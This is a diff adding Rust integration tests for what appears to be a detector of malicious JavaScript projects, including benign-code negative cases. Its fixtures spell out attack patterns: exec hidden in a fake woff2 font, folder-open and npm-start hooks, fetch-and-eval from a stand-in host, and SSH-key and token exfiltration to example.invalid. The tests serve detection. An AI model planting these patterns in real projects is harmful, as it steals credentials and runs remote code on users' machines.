@@ -102,6 +102,159 @@ fn build_config_import_elevates_fake_asset_with_process_execution() {
 }
 
 #[test]
+fn reconstructed_polinrider_woff2_trait_is_elevated_by_build_config() {
+    let root = temporary_directory("woff-loader");
+    fs::write(
+        root.join("tailwind.config.js"),
+        b"require('./fonts/icon.woff2');",
+    )
+    .unwrap();
+    fs::create_dir(root.join("fonts")).unwrap();
+    fs::write(
+        root.join("fonts/icon.woff2"),
+        b"const cp = require('child_process'); cp.exec('id');",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
+                && finding["severity"] == "critical"
+                && finding["file"] == "fonts/icon.woff2")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn reconstructed_folder_open_trait_links_task_to_script() {
+    let root = temporary_directory("folder-open-script");
+    fs::create_dir(root.join(".vscode")).unwrap();
+    fs::write(root.join(".vscode/tasks.json"), br#"{"tasks":[{"label":"boot","type":"shell","command":"node boot.js","runOptions":{"runOn":"folderOpen"}}]}"#).unwrap();
+    fs::write(
+        root.join("boot.js"),
+        b"const cp = require('child_process'); cp.exec('id');",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
+                && finding["evidence"].to_string().contains("folderOpen"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn reconstructed_interview_start_trait_reaches_hidden_import() {
+    let root = temporary_directory("start-hidden-import");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node index.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("index.js"),
+        b"require('./lib/config.js'); console.log('ready');",
+    )
+    .unwrap();
+    fs::create_dir(root.join("lib")).unwrap();
+    fs::write(root.join("lib/config.js"), b"async function boot() { const r = await fetch('https://example.invalid/control'); eval(await r.text()); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("npm start"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn npm_lifecycle_script_is_an_execution_root() {
+    let root = temporary_directory("lifecycle-root");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"postinstall":"node setup.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("setup.js"),
+        b"const cp = require('child_process'); cp.exec('id');",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
+                && finding["evidence"].to_string().contains("npm postinstall"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn benign_minified_bundle_does_not_become_critical() {
+    let root = temporary_directory("minified-benign");
+    let source = format!(
+        "const values=[{}]; console.log(values.length);",
+        "1,".repeat(50_000)
+    );
+    fs::write(root.join("bundle.js"), source).unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["severity"] != "critical")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn statically_dead_branch_does_not_create_a_remote_execution_chain() {
+    let root = temporary_directory("dead-branch");
+    fs::write(root.join("main.js"), b"if (false) { eval(await fetch('https://example.invalid/x')); } if (true) { console.log('ready'); }").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn unimported_fake_asset_is_not_elevated() {
     let root = temporary_directory("unreachable-asset");
     fs::write(
@@ -224,6 +377,24 @@ fn environment_secret_reaches_outbound_request() {
 }
 
 #[test]
+fn home_relative_credential_file_reaches_outbound_request() {
+    let root = temporary_directory("home-secret");
+    fs::write(root.join("main.js"), b"const fs = require('fs'); const path = require('path'); const os = require('os'); const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa')); fetch('https://example.invalid/collect', { method: 'POST', body: key });").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn remote_bytes_written_then_spawned_are_correlated() {
     let root = temporary_directory("write-spawn");
     fs::write(
@@ -287,12 +458,123 @@ fn benign_network_and_environment_use_do_not_form_exfiltration() {
 }
 
 #[test]
+fn benign_environment_flag_sent_to_service_is_not_critical() {
+    let root = temporary_directory("benign-env-flag");
+    fs::write(
+        root.join("main.js"),
+        b"fetch('/metrics', { method: 'POST', body: process.env.NODE_ENV });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["severity"] != "critical")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn npm_start_reaches_whitespace_concealed_process_call() {
+    let root = temporary_directory("concealed-start");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"npm run launch","launch":"node main.js"}}"#,
+    )
+    .unwrap();
+    let source = format!(
+        "const cp = require('child_process'); {}cp.exec('id');",
+        " ".repeat(800)
+    );
+    fs::write(root.join("main.js"), source).unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-CONCEALED-EXECUTION")
+        .unwrap();
+    assert_eq!(finding["severity"], "high");
+    assert!(finding["evidence"].to_string().contains("npm start"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn one_startup_route_correlates_exfiltration_and_remote_execution() {
+    let root = temporary_directory("combined-chain");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(root.join("main.js"), b"import axios from 'axios'; axios.post('https://example.invalid/collect', process.env.TOKEN); async function run() { const response = await axios.get('https://example.invalid/control'); eval(response.data); } run();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-COMBINED-ATTACK-CHAIN")
+        .unwrap();
+    assert_eq!(finding["severity"], "critical");
+    assert!(
+        finding["evidence"]
+            .to_string()
+            .contains("JS-SECRET-EXFILTRATION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn startup_file_write_is_reported_but_ordinary_write_is_not() {
+    let root = temporary_directory("persistence-write");
+    fs::write(root.join("main.js"), b"const fs = require('fs'); const os = require('os'); fs.writeFileSync(os.homedir() + '/.config/autostart/helper.desktop', 'x'); fs.writeFileSync('notes.txt', 'x');").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings: Vec<_> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-PERSISTENCE-WRITE")
+        .collect();
+    assert_eq!(findings.len(), 1);
+    assert!(findings[0]["evidence"].to_string().contains("autostart"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
     let missing = run(&["definitely-does-not-exist"]);
     let invalid = run(&[".", "--online"]);
 
     assert_eq!(missing.status.code(), Some(2));
     assert_eq!(invalid.status.code(), Some(3));
+}
+
+#[test]
+fn rule_commands_explain_implemented_detection() {
+    let list = run(&["rules"]);
+    let show = run(&["rules", "show", "JS-REMOTE-CODE-EXECUTION"]);
+    let explain = run(&["explain", "JS-REMOTE-CODE-EXECUTION"]);
+    let unknown = run(&["rules", "show", "UNKNOWN-RULE"]);
+
+    assert_eq!(list.status.code(), Some(0));
+    assert!(String::from_utf8_lossy(&list.stdout).contains("JS-REMOTE-CODE-EXECUTION"));
+    assert_eq!(show.status.code(), Some(0));
+    assert_eq!(show.stdout, explain.stdout);
+    assert_eq!(unknown.status.code(), Some(3));
 }
 
 fn run(arguments: &[&str]) -> std::process::Output {
